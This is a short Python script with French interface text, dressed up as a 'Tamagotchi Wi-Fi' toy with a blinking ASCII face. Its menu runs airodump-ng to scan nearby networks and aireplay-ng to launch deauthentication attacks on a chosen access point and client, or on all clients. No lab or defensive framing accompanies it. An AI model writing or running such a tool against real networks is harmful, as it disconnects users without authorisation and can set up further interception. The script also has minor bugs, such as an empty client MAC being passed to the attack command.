import subprocess
import time
import os
import threading

class TamagotchiWiFi:
    def __init__(self):
        self.running = True
        self.animation_running = True

    def scan_wifi(self):
        print("Scanning Wi-Fi networks...")
        subprocess.run(["airodump-ng", "--band", "g", "wlan1"])  # Remplacez wlan0 par votre interface

    def attack_wifi(self, bssid, mac):
        print(f"Lancement de l'attaque sur le BSSID {bssid} pour le MAC {mac}...")
        subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", mac, "wlan1"])

    def run(self):
        while self.running:
            print("\nMenu Tamagotchi Wi-Fi:")
            print("1. Scanner les réseaux Wi-Fi")
            print("2. Lancer une attaque")
            print("3. Quitter")
            choice = input("Choisissez une option: ")

            if choice == '1':
                self.scan_wifi()
            elif choice == '2':
                bssid = input("Entrez le BSSID de la cible: ")
                mac = input("Entrez le MAC de la cible (ou laissez vide pour attaquer tout le monde): ")
                self.attack_wifi(bssid, mac)
            elif choice == '3':
                self.running = False
            else:
                print("Option invalide. Veuillez réessayer.")

    def clear_terminal(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def afficher_visage(self, yeux_ouverts=True):
        if yeux_ouverts:
            visage = """
            ^_^
            ( • • )
             \\___/
            """
        else:
            visage = """
            ^_^
            ( - - )
             \\___/
            """
        print(visage)

    def animation_visage(self):
        try:
            while self.animation_running:
                self.clear_terminal()
                self.afficher_visage(yeux_ouverts=True)
                time.sleep(0.5)  # Temps d'attente avant de cligner
                self.clear_terminal()
                self.afficher_visage(yeux_ouverts=False)
                time.sleep(0.5)  # Temps d'attente avant de revenir
        except KeyboardInterrupt:
            self.animation_running = False

if __name__ == "__main__":
    tamagotchi = TamagotchiWiFi()
    
    # Démarrer l'animation dans un thread séparé
    animation_thread = threading.Thread(target=tamagotchi.animation_visage)
    animation_thread.start()

    # Lancer le menu Tamagotchi
    tamagotchi.run()

    # Arrêter l'animation lorsque le menu est quitté
    tamagotchi.animation_running = False
    animation_thread.join()  # Attendre que le thread d'animation se termine
    tamagotchi.clear_terminal()
    print("Programme terminé.")
